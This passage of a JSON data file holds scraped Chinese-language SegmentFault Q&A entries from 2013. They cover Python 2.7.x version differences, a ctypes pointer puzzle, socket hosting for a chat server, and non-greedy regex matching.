      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000320298\">\n<p>我碰到2.7.4修复了之前版本的OverflowError: user id too big错误，\n因为我在获取系统用户ID的时候碰到的。</p>\n<p>操作系统是OSX 10.8.3 64位。</p>\n<p><a href=\"http://bugs.python.org/issue4591\" rel=\"nofollow\">http://bugs.python.org/issue4591</a></p>\n<p>关于更新了那些东西，可以看看NEWS</p>\n<p><a href=\"http://hg.python.org/cpython/file/026ee0057e2d/Misc/NEWS#l334\" rel=\"nofollow\">http://hg.python.org/cpython/file/026ee0057e2d/Misc/NEWS#l334</a></p>\n<p>在Python的Tags可以看到所有的版本快照</p>\n<p><a href=\"http://hg.python.org/cpython/tags\" rel=\"nofollow\">http://hg.python.org/cpython/tags</a></p>\n<p>更新说明的文件在Misc目录下的NEWS文件。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000317281\">\n<p>按<a href=\"http://semver.org/\" rel=\"nofollow\">语义化版本号</a>，版本号第一位的变化是不向前兼容的（比如很多 Python 3 的代码不能在 Python 2 上运行，反之亦然），版本号第二位表示有新特性，但是不破坏向前兼容性（比如 Python 3.2 的代码（理论上）在 Python 3.3 上是可以完好地运行的，反过来不一定，因为可能用到了新引入的特性）。第三位表明有 bug 被修正，不引入新的特性而只修 bug，所以只要不遇到 bug，代码是可以在第三位不同的情况下正确运行的。</p>\n<p>不过，Python 可能并没严格按这个要求来。但基本上还是不会差太远的。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000317198\">\n<p>今天把 python 开发环境搬到 mac 上了 mac10.8.3 预装的是 python2.7.2 然后我之前是在python2.7.3 环境下面开发的</p>\n<p>想请问下各位大大 </p>\n<ul>\n<li>2.7.2;</li>\n<li>2.7.3;</li>\n<li>2.7.4;</li>\n<li>2.7.5</li>\n</ul>\n<p>这几个版本之间到底什么区别</p>\n<p>其实2.7.2和2.7.3差异不大的吧?</p>\n</div>",
      "favourite": "2",
      "glance": "3.1k",
      "tags": [
        "python",
        "django",
        "flask",
        "tornado",
        "web.py"
      ],
      "time": "2013-10-09",
      "title": "请问python2.7.x各个版本之间的差异",
      "url": "https://segmentfault.com/q/1010000000317198"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000328133\">\n<p>代码我也放在了gist上 <a href=\"https://gist.github.com/hit9/7244344\" rel=\"nofollow\">https://gist.github.com/hit9/7244344</a></p>\n<p>foolib.c:</p>\n<pre><code>typedef struct post {\n    char *x;\n    char *y;\n    int x_z;\n} post_t;\n\n\nvoid\nfoo (post_t *o, char *src)\n{\n    int i=0;\n\n    char *p = src;\n    int len = strlen(src);\n\n    for (; *p != '\\0'; i++, p++) {\n        if (*p == 'x') {\n            o-&gt;x = p;\n            o-&gt;x_z = len-i;\n        }\n    }\n    o-&gt;y=src;\n}\n</code></pre>\n<p>test.py:</p>\n<pre><code>from ctypes import *\n\nfoolib = CDLL(\"./foolib.so\")\n\nclass Post(Structure):\n    _fields_ = (\n        (\"x\", c_void_p),\n        (\"y\", c_void_p),\n        (\"x_z\", c_int),\n    )\n\no = Post()\n\ns = \"iooxooiddfggggggggggggvd\"\n\nfoolib.foo(byref(o), create_string_buffer(s))\n\nprint o.x_z\n\nprint string_at(o.x, o.x_z)\nprint string_at(o.y, len(s))\n</code></pre>\n<p>其中，foolib.c用来生成一个动态链接库 foolib.so</p>\n<p>打印结果为何是:</p>\n<pre><code>foo ➤ python test.py                                                                                                                   \n21\nooiddfggggggggggggvd\nooiddfggggggggggggvd\n</code></pre>\n<p>而不是</p>\n<pre><code>21\niooxooiddfggggggggggggvd\nooiddfggggggggggggvd\n</code></pre>\n<p>呢?</p>\n</div>",
      "favourite": "0",
      "glance": "2.2k",
      "tags": [
        "python"
      ],
      "time": "2013-10-31",
      "title": "ctypes.string_at的莫名奇妙的问题",
      "url": "https://segmentfault.com/q/1010000000328133"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000330221\">\n<p>只要是<strong>IaaS</strong>这类就可以，例如AWS的EC2</p>\n<blockquote>\n<p>美国国家标准和技术研究院的云计算定义中明确了三种服务模式：</p>\n<p><strong>软件即服务（SaaS）</strong>：消费者使用应用程序，但并不掌控操作系统、硬件或运作的网络基础架构。是一种服务观念的基础，软件服务供应商，以租赁的概念提供客户服务，而非购买，比较常见的模式是提供一组账号密码。例如：Microsoft CRM与Salesforce.com</p>\n<p><strong>平台即服务（PaaS）</strong>：消费者使用主机操作应用程序。消费者掌控运作应用程序的环境（也拥有主机部分掌控权），但并不掌控操作系统、硬件或运作的网络基础架构。平台通常是应用程序基础架构。例如：Google App Engine。</p>\n<p><strong>基础架构即服务（IaaS）</strong>：消费者使用“基础计算资源”，如处理能力、存储空间、网络组件或中间件。消费者能掌控操作系统、存储空间、已部署的应用程序及网络组件（如防火墙、负载平衡器等），但并不掌控云基础架构。例如：Amazon AWS、Rackspace。</p>\n</blockquote>\n<p>来源：\n1、 <a href=\"http://zh.wikipedia.org/wiki/%E9%9B%B2%E7%AB%AF%E9%81%8B%E7%AE%97\" rel=\"nofollow\">http://zh.wikipedia.org/wiki/%E9%9B%B2%E7%AB%AF%E9%81%8B%E7%AE%97</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000330338\">\n<p>想做聊天系统是吧，用底层的socket开发或许有点麻烦，你可以尝试<a href=\"http://socket.io/\" rel=\"nofollow\">socket.io</a>，并在BAE、SAE上搭建。<br/>\n这个东西似乎非常适合做聊天软件。</p>\n<p>服务端  </p>\n<pre><code class=\"lang-javascript\">var io = require('socket.io').listen(80);\n\nio.sockets.on('connection', function (socket) {\n  socket.emit('news', { hello: 'world' });\n  socket.on('my other event', function (data) {\n    console.log(data);\n  });\n});\n</code></pre>\n<p>客户端</p>\n<pre><code class=\"lang-javascript\">&lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n  var socket = io.connect('http://localhost');\n  socket.on('news', function (data) {\n    console.log(data);\n    socket.emit('my other event', { my: 'data' });\n  });\n&lt;/script&gt;\n</code></pre>\n<p>在客户端里，他会采取以下方式和服务器连接：</p>\n<ul>\n<li>WebSocket</li>\n<li>Adobe® Flash® Socket</li>\n<li>AJAX long polling</li>\n<li>AJAX multipart streaming</li>\n<li>Forever Iframe</li>\n<li>JSONP Polling</li>\n</ul>\n<p>所以浏览器兼容方面题主应该不比太操心，官方表示连Internet Explorer 5.5都支持。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000330213\">\n<p>感性的来看，云平台或虚拟主机空间，基本都不会提供<strong>主动运行守护进程</strong>的功能。</p>\n<p>你的需求恐怕需要VPS。掏钱吧。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000330210\">\n<p>目前想做一个聊天系统，服务端得要公网ip，所以想找一些网上的空间来托管我的服务端，但是找了sae，bae之类，无论哪种语言（java，node.js，python等）都不支持socket监听。我想用socket来搭建一个TCP的服务端啊，怎么才可以搭建？</p>\n</div>",
      "favourite": "4",
      "glance": "8.1k",
      "tags": [
        "socket服务端",
        "node.js",
        "java",
        "python",
        "聊天系统"
      ],
      "time": "2013-11-04",
      "title": "有哪些云平台（比如sae，bae之类）支持socket监听的，想做一个聊天系统。",
      "url": "https://segmentfault.com/q/1010000000330210"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000342321\">\n<p>python的正則默認是貪婪（greedy）的（事實上大多數正則的實現都這麼默認）。</p>\n<p>你的例子中有兩個<code>&lt;\\/td&gt;</code>，所以有兩種匹配，匹配到第一個，那就是你期望的結果 <code>[\"a\",\"b\"]</code>，匹配到第二個，那就是實際的結果，<code>[\"a&lt;/td&gt;&lt;td&gt;b\"]</code>。後者比前者長，所以最終匹配結果是第二個。這就是所謂的貪婪模式，找最長的匹配。</p>\n<p>你需要的是非貪婪（non-greedy）模式，也叫最小（minimal)模式，也就是匹配盡可能短的字符串。很簡單，只要加上一個<code>?</code>即可，也就是說改成<code>&lt;td&gt;(.*?)&lt;\\/td&gt;</code>。</p>\n<p>當然，非貪婪可能有性能問題。我不知道 python 有沒有針對這方面的優化。就你的問題而言，用貪婪模式也可以實現，比如  <code>&lt;td&gt;([^&lt;]*)&lt;\\/td&gt;</code>。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000342299\">\n<p>送你两个字\"断言\"，搜一下就明白了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000342325\">\n<p>你应该使用惰性数量修饰符（lazy/non-greedy qualifiers）。</p>\n<p><code>&lt;td&gt;(.*?)&lt;\\/td&gt;</code></p>\n<p>推荐阅读： <a href=\"http://deerchao.net/tutorials/regex/regex.htm#greedyandlazy\" rel=\"nofollow\">http://deerchao.net/tutorials/regex/regex.htm#greedyandlazy</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000342257\">\n<pre><code class=\"lang-html\">&lt;td&gt;a&lt;/td&gt;&lt;td&gt;b&lt;/td&gt;\n</code></pre>\n<p>正则表达式是: <code>&lt;td&gt;(.*)&lt;\\/td&gt;</code><br/>\n我期待出现: [\"a\",\"b\"]<br/>\n可是结果是: <code>[\"a&lt;/td&gt;&lt;td&gt;b\"]</code></p>\n</div>",
      "favourite": "1",
      "glance": "2.3k",
      "tags": [
        "python"
      ],
      "time": "2013-11-23",
      "title": "python 正则如何匹配最近的字符",
      "url": "https://segmentfault.com/q/1010000000342257"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000344924\">\n<p>指纹机在普通应用程序上应用比较广，在浏览器一端有指纹的接口吗？<br/>\n认证方式是把指纹图片发给服务器识别吧？有例子吗？</p>\n<p>python有这方面的库吗？</p>\n</div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "安全",
        "指纹",
        "python",
        "算法",
        "前端"
      ],
      "time": "2013-11-26",
      "title": "B/S应用如何使用指纹机认证",
      "url": "https://segmentfault.com/q/1010000000344924"
    }
  ]
}